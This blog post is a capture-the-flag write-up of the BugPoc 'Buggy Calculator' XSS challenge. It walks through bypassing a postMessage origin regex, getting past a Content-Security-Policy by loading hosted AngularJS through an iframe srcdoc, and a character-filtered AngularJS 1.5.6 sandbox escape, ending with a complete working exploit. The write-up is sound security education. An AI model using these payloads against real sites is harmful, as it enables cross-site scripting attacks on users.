---
layout: post
title:  "BugPoc - Buggy Calculator"
date:   2020-08-12 00:00
categories: [BugPoc]
tags: [Web]
author: smaury
---

Everything started with a [Tweet](https://twitter.com/bugpoc_official/status/1291767806216765443):
```
Check out our new XSS Challenge- $2,000 worth of prize money!  
Submit solutions to http://hackerone.com/bugpoc before 08/12.  
Rules: Must alert(domain), Must bypass CSP, Must work in Chrome, Must provide a BugPoC demo  
Good luck!  
#XSS #CTF #bugbounty #hacked
```

### Finding attacker-controllable input ###

When dealing with XSS challenges the very first step is to find some attacker-controllable input that can be used as a vector to exploit the actual XSS.  
This task is particularly easy in this challenge as the buggy calculator uses an `iframe` as calculator display and sends content updates through the `window.postMessage()` API.
**frame.html**

{% highlight html%}
{% raw %}
<!DOCTYPE html>
<html>
    <head>
        <meta charset="UTF-8">
        <meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' 'self'; object-src 'none'">
        <link href='https://fonts.googleapis.com/css?family=Ubuntu:400,700' rel='stylesheet' type='text/css'>
        <script src="frame.js"></script>
        <style>
        html {
            clear: both;
            font-family: digital;
            font-size: 24px;
            text-align: right;
            letter-spacing: 5px;
            font-family: 'Ubuntu', sans-serif;
            overflow: hidden;
        }
        </style>
        <title></title>
    </head>
    <body>
        0
    </body>
</html>
{% endraw %}
{% endhighlight %}

**frame.js**

{% highlight javascript%}
{% raw %}
window.addEventListener("message", receiveMessage, false);

function receiveMessage(event) {

    // verify sender is trusted
    if (!/^http:\/\/calc.buggywebsite.com/.test(event.origin)) {
        return
    }
    
    // display message 
    msg = event.data;
    if (msg == 'off') {
        document.body.style.color = '#95A799';
    } else if (msg == 'on') {
        document.body.style.color = 'black';
    } else if (!msg.includes("'") && !msg.includes("&")) {
        document.body.innerHTML=msg;
    }
}
{% endraw %}
{% endhighlight %}

### How postMessage works? ###

To understand why the `frame.html` page was chosen as our target it's required to explain how `window.postMessage()` works.
With the help of [MDN web docs](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) we can understand that:  
> The `window.postMessage()` method safely enables cross-origin communication between Window objects; e.g., between a page and a pop-up that it spawned, or between a page and an iframe embedded within it.  

So we can send a cross-origin message between two `Window` elements. Nice!

Following the documentation we can understand that on the recipient `Window` messages are handled by the callback function defined in the `EventListener` (in our case `receiveMessage`) and that the object passed to the callback contains the following properties:
- **data** - *The object passed from the other window.*
- **origin** - *The origin of the window that sent the message at the time postMessage was called. This string is the concatenation of the protocol and "://", the host name if one exists, and ":" followed by a port number if a port is present and differs from the default port for the given protocol.*
- **source** - *A reference to the window object that sent the message; you can use this to establish two-way communication between two windows with different origins.*

### Analysing the EventListener ###

Knowing that we can send messages with the `window.postMessage()` API we should check what the `EventListener` does.  

First it checks that the `origin` of the message is compliant to a specific RegEx:
{% highlight javascript%}
{% raw %}
    if (!/^http:\/\/calc.buggywebsite.com/.test(event.origin)) {
        return
    }
{% endraw %}
{% endhighlight %}

Then it checks if the content of the message is `on` or `off` to turn on or off the display and finally if it's different from the previous 2 cases it adds its content to the page via the `innerHTML` API (which would give us `HTML` injection as threats strings as trusted `HTML` code) given the fact that the input does not contain the character `'` and the character `&`.  

{% highlight javascript%}
{% raw %}
    // display message 
    msg = event.data;
    if (msg == 'off') {
        document.body.style.color = '#95A799';
    } else if (msg == 'on') {
        document.body.style.color = 'black';
    } else if (!msg.includes("'") && !msg.includes("&")) {
        document.body.innerHTML=msg;
    }
{% endraw %}
{% endhighlight %}

### Bypassing the event.origin check ###

As seen in the [documentation](https://developer.mozilla.org/en-US/docs/Web/API/Window/postMessage) the `event.origin` property contains the protocol + `://` + the domain + `:` + the port of the page sending the message. Such origin is checked via the following regEx `/^http:\/\/calc.buggywebsite.com/`, which stands for `event.origin` should start with `http://calc.buggywebsite.com`. 

*Can we bypass this check?*
Of course! Anyone could create a subdomain which starts with `calc.buggywebsite.com` (i.e. `calc.buggywebsite.com.attacker.tld`).

*Ok, but I don't want to buy a domain and I don't have one...*
That's not a big deal online services like [xip.io](https://xip.io) could be used to quickly reproduce this locally (i.e. `http://calc.buggywebsite.com.127.0.0.1.xip.io:8000/` could be used to point to a local `HTTP` server on port `8000` with a domain which bypasses the check). Moreover, while submitting the final PoC through [BugPoc.com](https://bugpoc.com) I realized that it also allows us to change the subdomain of the PoC!

Given the aforementioned bypass, we can use our desired trick to host the following HTLM page, which embeds `http://calc.buggywebsite.com/frame.html` in an iframe and sends a message to it containing `test`.
{% highlight html%}
{% raw %}
<iframe src="http://calc.buggywebsite.com/frame.html" name="target"></iframe>
<script>
    win = window.frames.target;
    setTimeout(function(){
        window.frames.target.postMessage("test","http://calc.buggywebsite.com/");
    }, 1000);
</script>
{% endraw %}
{% endhighlight %}

![PoC creation on BugPoc]({{ site.url }}/assets/BugPoc/BugPoc-1.JPG)

![PoC execution on BugPoc]({{ site.url }}/assets/BugPoc/BugPoc-2.JPG)

### Challenge solved!!1! ###

So now we have our working exploit to the HTML injection, we just need to send a simple `<img src=c onerror=alert(1)>` to exploit the XSS, right?

![Content-Security-Policy blocking payload]({{ site.url }}/assets/BugPoc/BugPoc-3.JPG)

Not so fast, as can be seen the the `frame.html` `<head>` section a `<meta>` tag declaring a [Content-Security-Policy](https://developer.mozilla.org/en-US/docs/Web/HTTP/CSP) is present.

{% highlight html%}
{% raw %}
<meta http-equiv="Content-Security-Policy" content="script-src 'unsafe-eval' 'self'; object-src 'none'">
{% endraw %}
{% endhighlight %}

### CSP analysis ###

The aforementioned CSP has allows to:
- use the `eval` and `eval`-like JavaScript functions
- load arbitrary JavaScript scripts from the `self`, aka the `calc.buggywebsite.com` domain

Usually, the second point is useful when the target website allows us to upload arbitrary files, then we can upload a `JavaScript` script and load it via `<script src=/path/to/script.js></script>`, but obviously a calculator doesn't allow any file upload.  

The other useful scenario is when we have some nice scripts hosted on the target domain which we can abuse and that's the case! Going back to the homepage of the calculator we can spot the inclusion of `http://calc.buggywebsite.com/angular.min.js`, which is `AngularJS 1.5.6`.

### CSP bypass with AngularJS ###

Bypassing the CSPs with AngularJS is a well-known technique, in fact when AngularJS is loaded in a page and you have an HTML injection you can create a new `ng-app` and write any AngularJS script between the curly brackets.  
Unfortunately, we don't have AngularJS loaded in the `/frame.html` page, but we have an `HTML` injection, so we can just inject a `<script>` tag and load `angular.min.js` right? Incorrect! Adding a `<script>` tag with `innerHTML` is [basically useless](https://developer.mozilla.org/en-US/docs/Web/API/Element/innerHTML#Security_considerations).

*What about creating a full new document?*
Yeah, that's the way! We can inject an `iframe` inside the `iframe` and set an arbitrary `HTML` content via the `srcdoc` attribute!

{% highlight html%}
{% raw %}
<iframe src="http://calc.buggywebsite.com/frame.html" name="target"></iframe>
<script>
    win = window.frames.target;
    setTimeout(function(){
        window.frames.target.postMessage('\u003ciframe srcdoc="\u003cscript src=/angular.min.js\u003E\u003c/script\u003e\u003cdiv ng-app\u003e{{6*7}}\u003c/div\u003E"\u003E\u003c/iframe\u003E',"http://calc.buggywebsite.com/");
    }, 1000);
</script>
{% endraw %}
{% endhighlight %}

![AngularJS injection]({{ site.url }}/assets/BugPoc/BugPoc-4.JPG)


### AngularJS sandbox escape and filter bypass ###

AngularJS from version 1.0 to version 1.5.9 has a sandbox, which [was removed in version 1.6](http://blog.angularjs.org/2016/09/angular-16-expression-sandbox-removal.html). The idea of the sandbox was to prevent attackers able to inject AngularJS code to automatically obtain arbitrary JavaScript injection. After an [infinite list of bypasses](https://github.com/swisskyrepo/PayloadsAllTheThings/blob/master/XSS%20Injection/XSS%20in%20Angular.md) the AngularJS team just removed the sandbox. 🤷🏾‍♂️

Fortunately for us a known sandbox escape for version 1.5.6 is available:
{% highlight javascript%}
{% raw %}
{{x = {'y':''.constructor.prototype}; x['y'].charAt=[].join;$eval('x=alert(1)');}}
{% endraw %}
{% endhighlight %}

Unfortunately for us, we can't use single quotes and we can't even use the common `srcdoc` trick to encode characters in `HTML entities` as the `&` character is blacklisted.

The only option is to use some `JavaScript-fu` and refactor the code not to use those characters!

The first step is to create a dict having as key a `String` and as value the `prototype` of the `constructor` of a `String`.
In JavaScript, we can create an empty string with `([]+[])` (stolen from [JSFuck](https://github.com/aemkei/jsfuck/blob/master/jsfuck.js#L20)) allowing us to easily rewrite the first part of the sandbox escape without `'` and `&`.

{% highlight javascript%}
{% raw %}
x = {}; x[([]+[])]=([]+[]).constructor.prototype; x[([]+[])].charAt=[].join;
{% endraw %}
{% endhighlight %}

For the second part, we can retrieve from the `String` `constructor` the `fromCharCode()` function and create a string out of the `ASCII` representation of characters.

{% highlight javascript%}
{% raw %}
$eval(x[([]+[])].constructor.fromCharCode(120,61,97,108,101,114,116,40,100,111,99,117,109,101,110,116,46,100,111,109,97,105,110,41));
{% endraw %}
{% endhighlight %}

Wrapping everything together we have our final exploit

{% highlight html%}
{% raw %}
<iframe src="http://calc.buggywebsite.com/frame.html" name="target"></iframe>
<script>
    win = window.frames.target;
    setTimeout(function(){
        window.frames.target.postMessage(unescape('%3Ciframe%20srcdoc%3D%22%3Cscript%20src%3D/angular.min.js%3E%3C/script%3E%3Cdiv%20ng-app%3E%7B%7B%20x%20%3D%20%7B%7D%3B%20x%5B%28%5B%5D+%5B%5D%29%5D%3D%28%5B%5D+%5B%5D%29.constructor.prototype%3B%20x%5B%28%5B%5D+%5B%5D%29%5D.charAt%3D%5B%5D.join%3B%24eval%28x%5B%28%5B%5D+%5B%5D%29%5D.constructor.fromCharCode%28120%2C61%2C97%2C108%2C101%2C114%2C116%2C40%2C100%2C111%2C99%2C117%2C109%2C101%2C110%2C116%2C46%2C100%2C111%2C109%2C97%2C105%2C110%2C41%29%29%3B%7D%7D%3C/div%3E%22%3E%3C/iframe%3E'),"http://calc.buggywebsite.com/");
    }, 1000);
</script>
{% endraw %}
{% endhighlight %}

![Final exploit]({{ site.url }}/assets/BugPoc/BugPoc-5.JPG)

To see it in action on BugPoc.com:  
- **URL:** https://bugpoc.com/poc#bp-jOA9FIM9  
- **Password:** `enoUgHHOrse25`

👋🏾 by [smaury](https://twitter.com/smaury92)